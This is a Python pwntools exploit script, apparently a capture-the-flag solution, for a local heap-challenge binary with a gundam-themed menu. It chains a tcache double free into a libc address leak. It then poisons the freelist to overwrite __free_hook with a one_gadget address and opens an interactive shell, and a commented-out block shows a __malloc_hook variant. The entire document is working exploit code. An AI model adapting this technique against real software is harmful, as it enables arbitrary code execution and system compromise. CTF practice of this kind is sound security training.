from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'Your choice : '
def add(name, typee=0):
	sla(menu, b'1')
	sda(b'gundam :', name)
	sla(b'gundam :', byte(typee))

def show():
	sla(menu, b'2')

def dele0(idx):
	sla(menu, b'3')
	sla(b'Destory:', byte(idx))
	
def dele1():
	sla(menu, b'4')

for i in range(9):
	add('A')

for i in range(1, 7):
	dele0(i)
dele0(0)
dele0(0)
dele1()
add('\n') # 0
show()
rut(b'Gundam[0] :')
libc.address = addr64(b'Type') - 0x3ebc0a
print("\033[32m[libc_base -> "+str(hex(libc.address))+"]\033[0m")
realloc = libc.sym.realloc
free_hook = libc.sym.__free_hook
malloc_hook = libc.sym.__malloc_hook
print("\033[32m[realloc -> "+str(hex(realloc))+"]\033[0m")
ones = [0x4f2c5, 0x4f322, 0x10a38c]
ones = [i+libc.address for i in ones]
add(b'\x00')
add(b'\x00')
dele0(7)
dele0(7)
"""
# malloc_hook
add(p64(malloc_hook-8))
add(b'1')
add(p64(ones[2])+p64(realloc+4))
sla(menu, b'1')
"""
# free_hook
add(p64(free_hook))
add(b'1')
add(p64(ones[1]))
dele0(7)

#debug()
sh()
